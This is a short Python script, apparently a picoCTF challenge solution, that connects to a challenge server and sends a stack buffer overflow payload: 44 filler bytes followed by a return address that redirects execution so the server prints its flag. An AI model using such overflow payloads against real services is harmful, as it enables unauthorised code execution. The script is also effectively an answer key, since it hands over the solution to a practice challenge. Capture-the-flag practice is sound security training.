#!/usr/bin/env python3

import socket

payload = b"A"*44 + b"\xf6\x91\x04\x08" + b"\n"

with socket.socket() as connection:

    connection.connect(("saturn.picoctf.net",54425))
    connection.recv(4096).decode("utf-8")
    connection.send(payload)
    text, flag = connection.recv(4096).decode("utf-8").split("\n")
    print(flag)